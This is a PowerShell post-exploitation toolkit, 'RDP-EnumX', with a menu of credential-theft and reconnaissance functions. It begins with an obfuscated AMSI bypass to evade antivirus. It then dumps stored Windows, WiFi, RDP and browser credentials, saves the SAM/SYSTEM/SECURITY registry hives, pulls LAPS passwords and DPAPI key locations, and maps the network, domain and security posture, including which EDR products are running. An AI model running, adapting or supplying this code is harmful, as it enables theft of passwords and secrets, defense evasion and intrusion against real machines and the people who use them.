$amsi  = [Ref].Assembly.GetType(('System.Management.Automation.{0}' -f 'AmsiUtils'))
$field = $amsi.GetField(('amsi{0}Failed' -f 'Init'), 'NonPublic,Static')
$field.SetValue($null, $true)

$ErrorActionPreference = 'SilentlyContinue'

$outputDir = "$env:USERPROFILE\AppData\Local\Temp\rdpenumx_$(Get-Date -Format 'yyyyMMdd_HHmm')"
New-Item -ItemType Directory -Path $outputDir -Force | Out-Null

function Test-Admin {
    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator
    )
}

function Write-Status {
    param([string]$msg, [string]$color = 'Gray')
    Write-Host "  $msg" -ForegroundColor $color
}

function Save-Json {
    param($data, [string]$file)
    $data | ConvertTo-Json -Depth 6 | Out-File "$outputDir\$file" -Encoding utf8
}

# ── CREDENTIALS ────────────────────────────────────────────────────────────────

function Func-CredManager {
    try {
        [void][Windows.Security.Credentials.PasswordVault, Windows.Security.Credentials, ContentType=WindowsRuntime]
        $vault = New-Object Windows.Security.Credentials.PasswordVault
        $all   = $vault.RetrieveAll()
        $out   = @()
        foreach ($c in $all) {
            try { $c.RetrievePassword() } catch { continue }
            if ($c.Password) {
                $out += [PSCustomObject]@{ Resource = $c.Resource; User = $c.UserName; Password = $c.Password }
            }
        }
        if ($out.Count -gt 0) {
            Save-Json $out 'credman.json'
            Write-Status "Credential Manager: $($out.Count) entries" Green
        } else { Write-Status "Credential Manager: empty" }
    } catch { Write-Status "Credential Manager: failed" }
}

function Func-CmdKey {
    $raw = cmdkey /list 2>$null
    if (-not $raw) { Write-Status "cmdkey: no output"; return }
    $out = @(); $cur = @{}
    foreach ($line in $raw) {
        if ($line -match '^\s*Target:\s*(.+)$') { $cur.Target = $Matches[1].Trim() }
        if ($line -match '^\s*Type:\s*(.+)$')   { $cur.Type   = $Matches[1].Trim() }
        if ($line -match '^\s*User:\s*(.+)$')   { $cur.User   = $Matches[1].Trim() }
        if ($line.Trim() -eq '' -and $cur.Count -gt 0 -and $cur.User) {
            $out += [PSCustomObject]$cur; $cur = @{}
        }
    }
    if ($cur.Count -gt 0 -and $cur.User) { $out += [PSCustomObject]$cur }
    if ($out.Count -gt 0) {
        Save-Json $out 'cmdkey.json'
        Write-Status "cmdkey: $($out.Count) stored credential(s)" Green
    } else { Write-Status "cmdkey: none" }
}

function Func-WiFi {
    $profiles = netsh wlan show profiles 2>$null | Select-String ':\s*(.+)$'
    if (-not $profiles) { Write-Status "WiFi: no profiles"; return }
    $out = @()
    foreach ($p in $profiles) {
        $name    = $p.Matches.Groups[1].Value.Trim()
        $detail  = netsh wlan show profile name="$name" key=clear 2>$null
        $keyLine = $detail | Select-String 'Key Content\s*:\s*(.+)$'
        $out    += [PSCustomObject]@{
            Profile  = $name
            Password = if ($keyLine) { $keyLine.Matches.Groups[1].Value.Trim() } else { $null }
        }
    }
    if ($out.Count -gt 0) {
        Save-Json $out 'wifi.json'
        Write-Status "WiFi: $($out.Count) profile(s), $(($out | Where-Object { $_.Password }).Count) with keys" Green
    }
}

function Func-RDP {
    $credPaths = @(
        "$env:APPDATA\Microsoft\Credentials",
        "$env:LOCALAPPDATA\Microsoft\Credentials",
        "$env:APPDATA\Microsoft\Protect",
        "$env:LOCALAPPDATA\Microsoft\Protect"
    )
    $blobs = $credPaths | ForEach-Object {
        Get-ChildItem -Path $_ -Recurse -File -ErrorAction SilentlyContinue
    } | Select-Object FullName, Length, LastWriteTime
    if ($blobs) {
        Save-Json $blobs 'rdp_credential_blobs.json'
        Write-Status "RDP: $($blobs.Count) credential blob(s)" Green
    }
    $rdpHosts = @()
    @('HKCU\Software\Microsoft\Terminal Server Client\Default',
      'HKCU\Software\Microsoft\Terminal Server Client\Servers') | ForEach-Object {
        $q = reg query $_ /s 2>$null
        if ($q) { $rdpHosts += $q }
    }
    if ($rdpHosts) {
        $rdpHosts | Out-File "$outputDir\rdp_history.txt" -Encoding ascii
        Write-Status "RDP: connection history saved" Green
    }
    $rdpFiles = Get-ChildItem "$env:USERPROFILE" -Filter '*.rdp' -Recurse -ErrorAction SilentlyContinue
    if ($rdpFiles) {
        $rdpFiles | Copy-Item -Destination $outputDir -Force
        Write-Status "RDP: $($rdpFiles.Count) .rdp file(s) copied" Green
    }
}

function Func-Browsers {
    $chromium = @(
        @{ Name = 'chrome';  Path = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
        @{ Name = 'edge';    Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
        @{ Name = 'brave';   Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
        @{ Name = 'opera';   Path = "$env:APPDATA\Opera Software\Opera Stable" },
        @{ Name = 'vivaldi'; Path = "$env:LOCALAPPDATA\Vivaldi\User Data" }
    )
    $grab = @('Login Data','Cookies','Local State','Web Data','Bookmarks')
    foreach ($b in $chromium) {
        if (-not (Test-Path $b.Path)) { continue }
        $dest = "$outputDir\browser_$($b.Name)"
        New-Item -ItemType Directory -Path $dest -Force | Out-Null
        Get-ChildItem -Path $b.Path -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $grab -contains $_.Name } |
            ForEach-Object {
                $rel = $_.FullName.Substring($b.Path.Length).TrimStart('\')
                $out = Join-Path $dest $rel
                New-Item -ItemType Directory -Path (Split-Path $out) -Force | Out-Null
                Copy-Item $_.FullName $out -Force
            }
        Write-Status "Browsers: $($b.Name) copied" Green
    }
    $ffBase = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $ffBase) {
        foreach ($ffp in Get-ChildItem $ffBase -Directory) {
            $ffDest = "$outputDir\browser_firefox_$($ffp.Name)"
            New-Item -ItemType Directory -Path $ffDest -Force | Out-Null
            @('logins.json','key4.db','cookies.sqlite','signons.sqlite','cert9.db') | ForEach-Object {
                $src = Join-Path $ffp.FullName $_
                if (Test-Path $src) { Copy-Item $src $ffDest -Force }
            }
        }
        Write-Status "Browsers: Firefox copied" Green
    }
}

function Func-Hives {
    if (-not (Test-Admin)) { Write-Status "Hives: admin required" Yellow; return }
    @{ SAM = 'sam.hive'; SYSTEM = 'system.hive'; SECURITY = 'security.hive' }.GetEnumerator() | ForEach-Object {
        reg save "HKLM\$($_.Key)" "$outputDir\$($_.Value)" /y 2>$null
        if (Test-Path "$outputDir\$($_.Value)") {
            Write-Status "Hives: $($_.Key) saved" Green
        } else {
            Write-Status "Hives: $($_.Key) failed"
        }
    }
}

function Func-Dpapi {
    $keys = @("$env:APPDATA\Microsoft\Protect","$env:LOCALAPPDATA\Microsoft\Protect") | ForEach-Object {
        Get-ChildItem -Path $_ -Recurse -File -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -match '^[0-9a-fA-F\-]{36}$' }
    }
    if ($keys) {
        Save-Json ($keys | Select-Object FullName, Length, LastWriteTime) 'dpapi_masterkeys.json'
        Write-Status "DPAPI: $($keys.Count) master key(s)" Green
    } else { Write-Status "DPAPI: none found" }
}

function Func-Unattended {
    $hits = @('C:\','C:\Windows\Panther','C:\Windows\System32\sysprep','C:\Windows\Setup\Scripts') | ForEach-Object {
        Get-ChildItem -Path $_ -Recurse -ErrorAction SilentlyContinue -Include '*.xml','*.txt','*.ini' |
            Where-Object { $_.Length -lt 2MB -and $_.Length -gt 0 -and $_.Name -match 'unattend|sysprep|autounattend|setupcomplete' }
    }
    if ($hits) {
        $hits | ForEach-Object { Copy-Item $_.FullName "$outputDir\unattended_$($_.Name)" -Force }
        Write-Status "Unattended: $($hits.Count) file(s)" Green
    } else { Write-Status "Unattended: none" }
}

function Func-LAPS {
    if (-not (Test-Admin)) { Write-Status "LAPS: admin required" Yellow; return }
    try {
        $laps = Get-ADComputer $env:COMPUTERNAME -Properties 'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime' -ErrorAction Stop
        if ($laps.'ms-Mcs-AdmPwd') {
            Save-Json ($laps | Select-Object Name,'ms-Mcs-AdmPwd','ms-Mcs-AdmPwdExpirationTime') 'laps.json'
            Write-Status "LAPS: password retrieved" Green
        } else { Write-Status "LAPS: attribute empty" }
    } catch { Write-Status "LAPS: not domain joined or AD module missing" }
}

function Func-ScheduledTasks {
    $tasks = Get-ScheduledTask | Where-Object {
        $_.Principal.LogonType -eq 'Password' -or
        ($_.Principal.UserId -and $_.Principal.UserId -notmatch '^(SYSTEM|NT AUTHORITY|BUILTIN|S-1-5-18|S-1-5-19|S-1-5-20)$')
    }
    if ($tasks) {
        Save-Json ($tasks | Select-Object TaskName, TaskPath,
            @{N='User';E={ $_.Principal.UserId }},
            @{N='LogonType';E={ $_.Principal.LogonType }},
            @{N='RunLevel';E={ $_.Principal.RunLevel }}) 'scheduled_tasks.json'
        Write-Status "Scheduled tasks: $($tasks.Count) with stored creds" Green
    } else { Write-Status "Scheduled tasks: none with stored creds" }
}

function Func-ServiceCreds {
    $svcs = Get-WmiObject Win32_Service -ErrorAction SilentlyContinue |
        Where-Object { $_.StartName -and $_.StartName -notmatch '^(LocalSystem|NT AUTHORITY|LocalService|NetworkService)$' } |
        Select-Object Name, DisplayName, StartName, StartMode, State, PathName
    if ($svcs) {
        Save-Json $svcs 'services_custom_accounts.json'
        Write-Status "Services: $($svcs.Count) under non-default accounts" Green
        $svcs | ForEach-Object { Write-Status "  $($_.Name) -> $($_.StartName)" Yellow }
    } else { Write-Status "Services: all under default accounts" }
}

function Func-PSHistory {
    $histPaths = @(
        "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
        "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    )
    $found = $false
    foreach ($p in $histPaths) {
        if (Test-Path $p) {
            Copy-Item $p "$outputDir\ps_history.txt" -Force
            $lines = (Get-Content $p).Count
            Write-Status "PS history: $lines lines copied" Green
            $found = $true
            break
        }
    }
    if (-not $found) { Write-Status "PS history: not found" }
}

function Func-RecentFiles {
    $recentPaths = @(
        "$env:APPDATA\Microsoft\Windows\Recent",
        "$env:APPDATA\Microsoft\Office\Recent"
    )
    $items = $recentPaths | ForEach-Object {
        Get-ChildItem -Path $_ -File -ErrorAction SilentlyContinue |
            Sort-Object LastWriteTime -Descending |
            Select-Object -First 50
    }
    if ($items) {
        Save-Json ($items | Select-Object Name, FullName, LastWriteTime, Length) 'recent_files.json'
        Write-Status "Recent files: $($items.Count) entries" Green
    } else { Write-Status "Recent files: none" }
}

function Func-InstalledSoftware {
    $regPaths = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
    )
    $sw = $regPaths | ForEach-Object {
        Get-ItemProperty $_ -ErrorAction SilentlyContinue |
            Where-Object { $_.DisplayName } |
            Select-Object DisplayName, DisplayVersion, Publisher, InstallDate, InstallLocation
    }
    if ($sw) {
        Save-Json $sw 'installed_software.json'
        Write-Status "Software: $($sw.Count) entries" Green
    }
}

function Func-EnvVars {
    $interesting = [System.Environment]::GetEnvironmentVariables() | ForEach-Object {
        $_.GetEnumerator() | Where-Object {
            $_.Key -match 'pass|pwd|secret|token|key|api|cred|auth|connect|jdbc|dsn|database' -or
            $_.Value -match 'password|secret|token'
        }
    }
    $all = [System.Environment]::GetEnvironmentVariables()
    Save-Json $all 'env_vars.json'
    if ($interesting) {
        Save-Json $interesting 'env_vars_interesting.json'
        Write-Status "Env vars: $($all.Count) total, $($interesting.Count) suspicious" Yellow
    } else {
        Write-Status "Env vars: $($all.Count) saved, none suspicious" Green
    }
}

# ── NETWORK ────────────────────────────────────────────────────────────────────

function Func-NetworkTopology {
    $out = [ordered]@{}

    $out['Interfaces'] = Get-NetIPAddress -ErrorAction SilentlyContinue |
        Select-Object InterfaceAlias, AddressFamily, IPAddress, PrefixLength

    $out['Routes'] = Get-NetRoute -ErrorAction SilentlyContinue |
        Where-Object { $_.RouteMetric -lt 9999 } |
        Select-Object DestinationPrefix, NextHop, InterfaceAlias, RouteMetric |
        Sort-Object RouteMetric

    $out['ARPCache'] = Get-NetNeighbor -ErrorAction SilentlyContinue |
        Where-Object { $_.State -ne 'Unreachable' } |
        Select-Object InterfaceAlias, IPAddress, LinkLayerAddress, State

    $out['DNSServers'] = Get-DnsClientServerAddress -ErrorAction SilentlyContinue |
        Where-Object { $_.ServerAddresses } |
        Select-Object InterfaceAlias, AddressFamily, ServerAddresses

    $out['DNSCache'] = Get-DnsClientCache -ErrorAction SilentlyContinue |
        Select-Object Entry, RecordName, RecordType, Data, TimeToLive |
        Sort-Object Entry

    $out['ListeningPorts'] = netstat -ano 2>$null | Select-String 'LISTENING' | ForEach-Object {
        $parts = $_.ToString().Trim() -split '\s+'
        [PSCustomObject]@{
            Proto   = $parts[0]
            Local   = $parts[1]
            PID     = $parts[-1]
        }
    }

    $out['EstablishedConnections'] = netstat -ano 2>$null | Select-String 'ESTABLISHED' | ForEach-Object {
        $parts = $_.ToString().Trim() -split '\s+'
        [PSCustomObject]@{
            Proto   = $parts[0]
            Local   = $parts[1]
            Remote  = $parts[2]
            PID     = $parts[-1]
        }
    }

    $out['Shares'] = Get-SmbShare -ErrorAction SilentlyContinue |
        Select-Object Name, Path, Description, CurrentUsers

    $out['MappedDrives'] = Get-PSDrive -PSProvider FileSystem -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayRoot } |
        Select-Object Name, Root, DisplayRoot, Description

    $out['FirewallProfiles'] = Get-NetFirewallProfile -ErrorAction SilentlyContinue |
        Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction

    Save-Json $out 'network_topology.json'
    Write-Status "Network: interfaces, routes, ARP, DNS, ports, shares saved" Green

    Write-Host "`n  --- Network Summary ---" -ForegroundColor Cyan
    $out['Interfaces'] | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.IPAddress -ne '127.0.0.1' } |
        ForEach-Object { Write-Host "  $($_.InterfaceAlias): $($_.IPAddress)/$($_.PrefixLength)" -ForegroundColor White }
    if ($out['EstablishedConnections']) {
        Write-Host "  Established connections: $($out['EstablishedConnections'].Count)" -ForegroundColor White
    }
    if ($out['Shares']) {
        Write-Host "  Shares: $($out['Shares'].Name -join ', ')" -ForegroundColor Yellow
    }
}

# ── DOMAIN / USER CONTEXT ──────────────────────────────────────────────────────

function Func-DomainContext {
    $out = [ordered]@{}

    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    $out['CurrentUser'] = [ordered]@{
        Name        = $id.Name
        IsAdmin     = (Test-Admin)
        IsSystem    = $id.IsSystem
        AuthType    = $id.AuthenticationType
        Groups      = $id.Groups | ForEach-Object {
            try { $_.Translate([Security.Principal.NTAccount]).Value } catch { $_.Value }
        }
    }

    $out['LocalUsers'] = Get-LocalUser -ErrorAction SilentlyContinue |
        Select-Object Name, Enabled, LastLogon, PasswordRequired, PasswordLastSet, Description

    $out['LocalGroups'] = Get-LocalGroup -ErrorAction SilentlyContinue | ForEach-Object {
        $members = Get-LocalGroupMember $_.Name -ErrorAction SilentlyContinue |
            Select-Object Name, ObjectClass, PrincipalSource
        [PSCustomObject]@{ Group = $_.Name; Members = $members }
    }

    $out['LoggedOnUsers'] = query user 2>$null | Select-Object -Skip 1 | ForEach-Object {
        $parts = $_ -split '\s{2,}'
        [PSCustomObject]@{
            User    = $parts[0].Trim().TrimStart('>')
            Session = $parts[1].Trim()
            ID      = $parts[2].Trim()
            State   = $parts[3].Trim()
            IdleTime = if ($parts.Count -gt 4) { $parts[4].Trim() } else { $null }
            LogonTime = if ($parts.Count -gt 5) { $parts[5].Trim() } else { $null }
        }
    }

    try {
        $domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        $out['Domain'] = [ordered]@{
            Name            = $domain.Name
            Forest          = $domain.Forest.Name
            DomainControllers = $domain.DomainControllers | Select-Object Name, IPAddress, OSVersion
            Trusts          = $domain.GetAllTrustRelationships() | Select-Object SourceName, TargetName, TrustType, TrustDirection
        }
    } catch {
        $out['Domain'] = 'Not domain joined or enumeration failed'
    }

    $out['TokenPrivileges'] = whoami /priv 2>$null | Select-String 'Se' | ForEach-Object {
        $parts = $_ -split '\s{2,}'
        [PSCustomObject]@{ Privilege = $parts[0].Trim(); State = $parts[-1].Trim() }
    }

    Save-Json $out 'domain_context.json'
    Write-Status "Domain context: user, groups, sessions, domain, privileges saved" Green

    Write-Host "`n  --- Context Summary ---" -ForegroundColor Cyan
    Write-Host "  User:  $($out['CurrentUser'].Name)" -ForegroundColor White
    Write-Host "  Admin: $($out['CurrentUser'].IsAdmin)" -ForegroundColor $(if ($out['CurrentUser'].IsAdmin) { 'Green' } else { 'Yellow' })
    if ($out['LoggedOnUsers']) {
        Write-Host "  Active sessions:" -ForegroundColor White
        $out['LoggedOnUsers'] | ForEach-Object { Write-Host "    $($_.User) [$($_.State)]" -ForegroundColor White }
    }
    $enabled = $out['TokenPrivileges'] | Where-Object { $_.State -eq 'Enabled' }
    if ($enabled) {
        Write-Host "  Enabled privileges:" -ForegroundColor Yellow
        $enabled | ForEach-Object { Write-Host "    $($_.Privilege)" -ForegroundColor Yellow }
    }
}

# ── SYSTEM INFO ────────────────────────────────────────────────────────────────

function Func-SystemInfo {
    $out = [ordered]@{}

    $cs = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
    $os = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
    $bios = Get-CimInstance Win32_BIOS -ErrorAction SilentlyContinue

    $out['System'] = [ordered]@{
        Hostname        = $env:COMPUTERNAME
        Domain          = $cs.Domain
        Manufacturer    = $cs.Manufacturer
        Model           = $cs.Model
        TotalRAM_GB     = [math]::Round($cs.TotalPhysicalMemory / 1GB, 2)
        OS              = $os.Caption
        OSVersion       = $os.Version
        BuildNumber     = $os.BuildNumber
        Architecture    = $os.OSArchitecture
        InstallDate     = $os.InstallDate
        LastBoot        = $os.LastBootUpTime
        Uptime          = (Get-Date) - $os.LastBootUpTime | Select-Object Days, Hours, Minutes
        TimeZone        = (Get-TimeZone).DisplayName
        BIOSVersion     = $bios.SMBIOSBIOSVersion
        SerialNumber    = $bios.SerialNumber
    }

    $out['Hotfixes'] = Get-HotFix -ErrorAction SilentlyContinue |
        Sort-Object InstalledOn -Descending |
        Select-Object HotFixID, Description, InstalledOn, InstalledBy |
        Select-Object -First 30

    $out['Disks'] = Get-PSDrive -PSProvider FileSystem -ErrorAction SilentlyContinue |
        Select-Object Name, Root,
            @{N='Used_GB';  E={ [math]::Round(($_.Used / 1GB), 2) }},
            @{N='Free_GB';  E={ [math]::Round(($_.Free / 1GB), 2) }}

    $out['RunningProcesses'] = Get-Process -ErrorAction SilentlyContinue |
        Select-Object Id, Name, Path, Company, CPU, WorkingSet64 |
        Sort-Object WorkingSet64 -Descending

    $out['StartupItems'] = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'
    ) | ForEach-Object {
        $key = $_
        Get-ItemProperty $key -ErrorAction SilentlyContinue | ForEach-Object {
            $_.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } |
                ForEach-Object { [PSCustomObject]@{ Key = $key; Name = $_.Name; Value = $_.Value } }
        }
    }

    $out['AntiVirusProducts'] = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue |
        Select-Object displayName, productState, timestamp

    Save-Json $out 'system_info.json'
    Write-Status "System info: OS, hotfixes, disks, processes, startup items saved" Green

    Write-Host "`n  --- System Summary ---" -ForegroundColor Cyan
    Write-Host "  $($out['System'].OS) (Build $($out['System'].BuildNumber))" -ForegroundColor White
    Write-Host "  Uptime: $($out['System'].Uptime.Days)d $($out['System'].Uptime.Hours)h" -ForegroundColor White
    Write-Host "  Hotfixes loaded: $($out['Hotfixes'].Count)" -ForegroundColor White
    if ($out['StartupItems']) {
        Write-Host "  Startup entries: $($out['StartupItems'].Count)" -ForegroundColor Yellow
    }
}

# ── SECURITY POSTURE ───────────────────────────────────────────────────────────

function Func-SecurityPosture {
    $out = [ordered]@{}

    $out['InstalledAV'] = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue |
        Select-Object displayName, productState, timestamp

    try {
        $pref = Get-MpPreference
        $stat = Get-MpComputerStatus
        $out['Defender'] = [ordered]@{
            Enabled                = $stat.AntivirusEnabled
            RealTimeProtection     = -not $pref.DisableRealtimeMonitoring
            BehaviorMonitoring     = -not $pref.DisableBehaviorMonitoring
            ScriptScanning         = -not $pref.DisableScriptScanning
            IOAVProtection         = -not $pref.DisableIOAVProtection
            NetworkProtection      = $pref.EnableNetworkProtection
            ControlledFolderAccess = $pref.EnableControlledFolderAccess -ne 0
            TamperProtection       = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Features' -Name TamperProtection -ErrorAction SilentlyContinue).TamperProtection
            CloudProtection        = -not $pref.DisableBlockAtFirstSeen
            SampleSubmission       = $pref.SubmitSamplesConsent
            LastQuickScan          = $stat.LastQuickScanTime
            LastFullScan           = $stat.LastFullScanTime
            SignatureVersion       = $stat.AntivirusSignatureVersion
            EngineVersion          = $stat.AMEngineVersion
            ExcludedPaths          = $pref.ExclusionPath
            ExcludedExtensions     = $pref.ExclusionExtension
            ExcludedProcesses      = $pref.ExclusionProcess
        }
    } catch { $out['Defender'] = 'unavailable' }

    $edr = 'crowdstrike|csagent|falcon|sentinelone|s1agent|carbonblack|cbdefense|cortex|cybereason|elastic|harfanglab|morphisec|cylance|fireeye|tanium|sophos|msmpeng|sense|wdnisdrv'

    $out['EDRProcesses'] = Get-Process -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match $edr -or $_.Path -match $edr } |
        Select-Object Id, Name, Path, Company, StartTime

    $out['EDRServices'] = Get-Service -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match $edr -or $_.DisplayName -match $edr } |
        Select-Object Name, DisplayName, Status, StartType

    $out['EDRDrivers'] = Get-WmiObject Win32_SystemDriver -ErrorAction SilentlyContinue |
        Where-Object { $_.Name -match $edr -or $_.DisplayName -match $edr } |
        Select-Object Name, DisplayName, State, PathName

    $out['ASRRules'] = try {
        $ids     = (Get-MpPreference).AttackSurfaceReductionRules_Ids
        $actions = (Get-MpPreference).AttackSurfaceReductionRules_Actions
        if ($ids) {
            0..($ids.Count - 1) | ForEach-Object {
                [PSCustomObject]@{ RuleId = $ids[$_]; Action = $actions[$_] }
            }
        }
    } catch { $null }

    $out['LSAProtection'] = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -ErrorAction SilentlyContinue).RunAsPPL
    $out['CredentialGuard'] = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard' -ErrorAction SilentlyContinue).EnableVirtualizationBasedSecurity
    $out['WDigest'] = (Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -ErrorAction SilentlyContinue).UseLogonCredential

    Save-Json $out 'security_posture.json'
    Write-Status "Security posture: saved" Green

    Write-Host "`n  --- Security Summary ---" -ForegroundColor Cyan
    if ($out['EDRProcesses']) {
        Write-Host "  EDR detected:" -ForegroundColor Red
        $out['EDRProcesses'] | ForEach-Object { Write-Host "    $($_.Name) (PID $($_.Id))" -ForegroundColor Red }
    } else {
        Write-Host "  No known EDR processes" -ForegroundColor Green
    }
    if ($out['Defender'] -is [System.Collections.Specialized.OrderedDictionary]) {
        Write-Host "  Defender RTP:     $($out['Defender'].RealTimeProtection)" -ForegroundColor $(if ($out['Defender'].RealTimeProtection) { 'Red' } else { 'Green' })
        Write-Host "  Tamper protect:   $($out['Defender'].TamperProtection)" -ForegroundColor $(if ($out['Defender'].TamperProtection -gt 0) { 'Red' } else { 'Green' })
        if ($out['Defender'].ExcludedPaths) {
            Write-Host "  Defender exclusions:" -ForegroundColor Green
            $out['Defender'].ExcludedPaths | ForEach-Object { Write-Host "    $_" -ForegroundColor Green }
        }
    }
    Write-Host "  LSA Protection:   $($out['LSAProtection'])" -ForegroundColor $(if ($out['LSAProtection'] -eq 1) { 'Red' } else { 'Green' })
    Write-Host "  WDigest plaintext: $($out['WDigest'])" -ForegroundColor $(if ($out['WDigest'] -eq 1) { 'Green' } else { 'Red' })
    Write-Host "  Credential Guard: $($out['CredentialGuard'])" -ForegroundColor $(if ($out['CredentialGuard'] -eq 1) { 'Red' } else { 'Green' })
}

function Func-StickyKeys {
    $ifeo = @('sethc.exe','utilman.exe','osk.exe','narrator.exe','magnify.exe') | ForEach-Object {
        $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$_"
        if (Test-Path $path) {
            $val = Get-ItemProperty $path -ErrorAction SilentlyContinue
            [PSCustomObject]@{ Binary = $_; Debugger = $val.Debugger }
        }
    }
    if ($ifeo) {
        Save-Json $ifeo 'accessibility_backdoors.json'
        Write-Status "Accessibility backdoors found:" Yellow
        $ifeo | ForEach-Object { Write-Status "  $($_.Binary) -> $($_.Debugger)" Yellow }
    } else { Write-Status "No accessibility backdoors" Green }
}

# ── MENU ───────────────────────────────────────────────────────────────────────

function Show-Menu {
    Clear-Host
    $adminTag = if (Test-Admin) { 'ADMIN' } else { 'USER' }
    Write-Host @"

  RDP-EnumX  |  Situational Awareness & Credential Toolkit
  [$adminTag | $env:USERDOMAIN\$env:USERNAME]
  ──────────────────────────────────────────────────────────

  Situational Awareness
    1   Network topology  (interfaces, routes, ARP, DNS, ports, shares)
    2   Domain context    (user, groups, sessions, privileges, trusts)
    3   System info       (OS, hotfixes, processes, startup, disks)

  Credentials
    4   Windows Credential Manager
    5   cmdkey stored credentials
    6   WiFi profiles + passwords
    7   RDP saved creds, history, .rdp files
    8   Browser files  (Chrome / Edge / Brave / Opera / Firefox)
    9   LAPS local admin password              [admin]
   10   Unattended / sysprep files
   11   SAM / SYSTEM / SECURITY hives          [admin]
   12   DPAPI master key locations
   13   Scheduled tasks with stored credentials
   14   Services under non-default accounts
   15   PowerShell history
   16   Recently accessed files
   17   Installed software
   18   Environment variables

  Recon
   19   Security posture  (AV / EDR / Defender / ASR / WDigest / LSA)
   20   Accessibility key backdoors  (IFEO)

    0   Exit
  ──────────────────────────────────────────────────────────
  Output: $outputDir

"@ -ForegroundColor Cyan
    return (Read-Host "  Choice").Trim()
}

do {
    $choice = Show-Menu
    switch ($choice) {
        '1'  { Func-NetworkTopology }
        '2'  { Func-DomainContext }
        '3'  { Func-SystemInfo }
        '4'  { Func-CredManager }
        '5'  { Func-CmdKey }
        '6'  { Func-WiFi }
        '7'  { Func-RDP }
        '8'  { Func-Browsers }
        '9'  { Func-LAPS }
        '10' { Func-Unattended }
        '11' { Func-Hives }
        '12' { Func-Dpapi }
        '13' { Func-ScheduledTasks }
        '14' { Func-ServiceCreds }
        '15' { Func-PSHistory }
        '16' { Func-RecentFiles }
        '17' { Func-InstalledSoftware }
        '18' { Func-EnvVars }
        '19' { Func-SecurityPosture }
        '20' { Func-StickyKeys }
        '0'  { break }
        default { Write-Host "  invalid" -ForegroundColor Red }
    }
    if ($choice -ne '0') {
        Write-Host ""
        Write-Host "  Press any key..." -ForegroundColor DarkGray
        $null = $host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
    }
} while ($choice -ne '0')

Write-Host "`n  Done. Output: $outputDir`n" -ForegroundColor Green
